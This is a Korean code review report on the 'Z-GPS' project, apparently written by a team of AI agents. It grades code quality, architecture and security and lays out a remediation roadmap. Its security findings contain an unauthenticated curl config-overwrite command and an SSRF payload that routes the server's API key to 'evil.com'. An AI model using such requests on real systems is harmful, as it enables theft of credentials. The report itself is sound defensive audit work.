# Z-GPS 프로젝트 통합 코드 리뷰 리포트

**분석일**: 2026-02-17
**분석 팀**: 4개 전문 에이전트 (code-analyzer, security-architect, frontend-architect, gap-detector)

---

## 종합 평가

| 평가 영역 | 점수 | 등급 |
|-----------|:----:|:----:|
| 코드 품질 | 58/100 | D+ |
| 프론트엔드 아키텍처 | 2.2/5 | C- |
| 보안 | 17건 취약점 (Critical 4) | F |
| 설계-구현 일치도 | 82% | C+ |
| **종합** | **52/100** | **D** |

> **판정**: Critical 보안 이슈 해결 전까지 프로덕션 배포 보류 권장

---

## 1. Critical 이슈 (즉시 수정 — 8건)

### SEC-01. 전체 API 인증/인가 완전 부재
- **파일**: `server/src/index.ts:26-35`
- **위험**: 40개+ 엔드포인트가 인증 없이 공개. Railway URL만 알면 누구든 기업 데이터 열람/삭제/설정 변경 가능
- **공격 시나리오**: `curl -X PUT https://[railway-url]/api/vault/config -d '{"geminiApiKey":"stolen"}'`

### SEC-02. SSRF 취약점 — ODCloud 프록시
- **파일**: `server/src/routes/odcloud.ts:19-21`
- **위험**: `endpointPath` 파라미터 미검증으로 서버의 API 키가 공격자에게 전송 가능
- **공격**: `?endpointPath=@evil.com/steal?x=` → 서버가 `https://api.odcloud.kr/api@evil.com/steal?x=...&serviceKey=실제키` 로 요청

### SEC-03. 서버 설정 무인증 변조 + 프로토타입 오염
- **파일**: `server/src/routes/vault.ts:2323-2354`
- **위험**: `PUT /api/vault/config`가 `Object.assign(config, updates)`로 서버 설정 및 `process.env` 런타임 변경. `__proto__` 오염 가능

### SEC-04. Rate Limiting 완전 부재
- **파일**: `server/src/index.ts`
- **위험**: helmet, express-rate-limit 미설치. Gemini API 무제한 호출로 과금 폭탄 유발 가능

### SEC-05. 클라이언트에서 Gemini SDK 직접 호출 (API 키 노출)
- **파일**: `components/VoiceConsultant.tsx:29,39`
- **위험**: `getStoredApiKey() || process.env.API_KEY`로 브라우저에 API 키 완전 노출
- **CLAUDE.md 위반**: "API 키는 서버사이드 only — 프론트엔드에 노출 금지"

### SEC-06. 내부 에러 정보 클라이언트 노출
- **파일**: `server/src/routes/gemini.ts:74`, `vault.ts` 다수
- **위험**: `details: String(error)`로 스택 트레이스, 파일 경로 등 내부 정보 유출

### SEC-07. 요청 Body 입력 검증 부재
- **파일**: `server/src/routes/gemini.ts:23`
- **위험**: `req.body as GenerateRequestBody` 타입 단언만 사용. 50MB JSON 허용 (DoS)

### SEC-08. .env.example에 VITE_API_KEY 잔존
- **파일**: `.env.example:3,7,15`
- **위험**: 프론트엔드 빌드에 API 키가 포함될 수 있는 설정 가이드

---

## 2. Major 이슈 (1주 내 수정 권장 — 15건)

### 아키텍처

| # | 이슈 | 파일 | 영향 |
|---|------|------|------|
| A-01 | vault.ts 4,694줄 God Object | `server/src/routes/vault.ts` | 44개 핸들러 단일 파일, 유지보수 불가 |
| A-02 | ErrorBoundary 선언만 되고 미사용 | `index.tsx`, `App.tsx` | 렌더 에러 시 앱 전체 흰 화면 |
| A-03 | 전역 상태 관리 부재 | 프로젝트 전체 | `getStoredCompany()` 각 컴포넌트에서 개별 호출, 동기화 불가 |
| A-04 | 코드 분할(Lazy Loading) 전무 | `App.tsx` | 모든 페이지가 초기 번들에 포함 |
| A-05 | QAController 200줄 인라인 | `App.tsx` | App.tsx 비대화, 관심사 혼재 |

### 코드 품질

| # | 이슈 | 파일 | 영향 |
|---|------|------|------|
| Q-01 | `cleanAndParseJSON` 프론트/백엔드 이중 구현 | `geminiAgents.ts`, `geminiService.ts` | 미묘한 동작 차이 |
| Q-02 | `formatKRW`, `getDday` 3곳+ 중복 | `Dashboard.tsx`, `BenefitTracker.tsx`, `ApplicationList.tsx` | 수정 시 누락 위험 |
| Q-03 | geminiAgents.ts 30+ 스텁 클래스 | `services/geminiAgents.ts:389-435` | "Demo" 반환, 메모리 낭비 |
| Q-04 | `Math.random()`으로 지원금/적합도 생성 | `services/apiService.ts:54,57` | 사용자에게 허위 정보 표시 |
| Q-05 | apiClient 에러 처리 4곳 반복 | `services/apiClient.ts:43-144` | 구조화된 ApiError 클래스 필요 |
| Q-06 | `as any` 12곳 사용 | VoiceConsultant, ExpertMatch 등 | 타입 안전성 우회 |
| Q-07 | Sidebar.tsx 기업명 하드코딩 | `components/Sidebar.tsx:117` | "산너머남촌" 고정 |
| Q-08 | GoogleGenAI 매 요청마다 재생성 | `server/src/routes/gemini.ts:31` | 불필요한 인스턴스 생성 |
| Q-09 | agentOrchestrator.executeTask 플레이스홀더 | `services/agentOrchestrator.ts:201-216` | 500ms 대기 후 항상 성공 반환 |
| Q-10 | waitForTasks 타임아웃 없음 | `services/agentOrchestrator.ts:320-334` | 잠재적 무한 루프 |

---

## 3. 프론트엔드 아키텍처 상세 평가

| 영역 | 점수 | 핵심 문제 |
|------|:----:|-----------|
| 컴포넌트 설계 | 2.5/5 | BenefitTracker 1,744줄, Settings 1,637줄 거대 컴포넌트 |
| 상태 관리 | 2.0/5 | 전역 상태 라이브러리 없음, useModalState에 11개 모달 집적 |
| 라우팅 | 3.0/5 | HashRouter 사용, 에디터 라우트 중복, 미등록 컴포넌트 다수 |
| API 통신 | 3.5/5 | apiClient 잘 구조화, SSE 올바른 구현. 에러 클래스 부재 |
| 에러 바운더리 | 1.5/5 | **ErrorBoundary 미사용 (치명적)** |
| 접근성 (a11y) | 1.5/5 | aria-hidden 없는 아이콘, button으로 네비게이션, focus trap 없음 |
| 코드 분할 | 1.0/5 | lazy loading 전무, 모든 컴포넌트 정적 import |

---

## 4. 설계-구현 갭 분석 (Match Rate: 82%)

| 카테고리 | Match Rate | 핵심 갭 |
|----------|:----------:|---------|
| CLAUDE.md 규칙 | 78% | VoiceConsultant의 process.env + SDK 직접 사용 |
| FUNCTIONAL_SPEC | 85% | BenefitTracker/세금환급 기능 미문서화, SSE "미구현" 오기 |
| VAULT_PIPELINE_CONTRACT | 92% | ODCLOUD 엔드포인트 기본값 불일치 |
| types.ts | 75% | 미사용 타입 4개, stub 수준 타입 다수 |
| constants.ts | 90% | deprecated DRAFT_SECTIONS 미제거, MOCK_PROGRAMS 빈 배열 |

---

## 5. 수정 로드맵

### Phase 1: 보안 패치 (즉시, 1-2일)

```
1. helmet + express-rate-limit 설치 및 적용
2. API 인증 미들웨어 추가 (최소 x-api-token 방식)
3. odcloud.ts endpointPath 화이트리스트 검증
4. vault config 엔드포인트 인증 + Object.assign → 안전한 필드별 할당
5. gemini.ts 입력 검증 (Zod) + body 크기 제한
6. 에러 응답에서 내부 정보 제거
7. .env.example 미사용 VITE_*키 변수 제거
```

### Phase 2: 안정성 강화 (1주)

```
1. ErrorBoundary를 index.tsx + 주요 라우트에 배치
2. Route-based Lazy Loading (React.lazy + Suspense)
3. VoiceConsultant process.env 참조 제거
4. storageService.ts 모든 JSON.parse에 try-catch 적용
5. gemini.ts GEMINI_API_KEY 미설정 시 500 → 503 변경
6. Sidebar.tsx 하드코딩 기업명 제거
```

### Phase 3: 아키텍처 개선 (2주)

```
1. vault.ts 도메인별 6-7개 파일로 분할
2. formatKRW, getDday 등 공유 유틸리티 추출
3. Zustand 도입 — Company 전역 상태
4. apiClient에 구조화된 ApiError 클래스 추가
5. apiService.ts Math.random() 지원금/점수 제거
6. geminiAgents.ts 스텁 에이전트 30개+ 정리
```

### Phase 4: 품질 향상 (1개월)

```
1. BenefitTracker (1,744줄) 서브컴포넌트 분해
2. Settings (1,637줄) 서브컴포넌트 분해
3. 접근성 개선 (aria-hidden, NavLink 전환, focus trap)
4. useModalState 분리 또는 activeModal 패턴 전환
5. FUNCTIONAL_SPEC.md 업데이트 (BenefitTracker, SSE 반영)
6. 미사용 타입/상수/컴포넌트 정리
```

---

## 6. 긍정적 평가 (잘 된 점)

1. **훅 분리 패턴**: `useEditorState` / `useModalState` / `useAITools`로 편집기 상태를 관심사 기준으로 분리한 것은 모범적
2. **API 클라이언트 중앙화**: `apiClient.ts`가 일관된 fetch 래퍼 제공 (GET/POST/PUT/PATCH/DELETE)
3. **SSE 구현**: POST 기반 SSE를 ReadableStream으로 직접 파싱하는 올바른 구현
4. **DEV 가드 로깅**: 대부분의 console.log에 `import.meta.env.DEV` 가드 적용
5. **EligibilityStatus enum**: 설계대로 enum 사용 일관성 유지 (13곳+)
6. **네이밍 컨벤션**: PascalCase 컴포넌트, camelCase 서비스, UPPER_SNAKE_CASE 상수 준수
7. **의존성 방향**: components → services → repositories 단방향 유지
8. **Toast 시스템**: Context + 커스텀 이벤트 브리지로 React/non-React 코드 모두 지원
9. **Agent 이름 규칙**: CLAUDE.md 명시 에이전트 이름/시그니처 100% 준수
10. **Vault 파이프라인**: VAULT_PIPELINE_CONTRACT.md 8개 작업 모두 구현 (92% 일치)

---

**작성**: code-analyzer, security-architect, frontend-architect, gap-detector 에이전트 팀
**통합**: Leader (Opus 4.6)
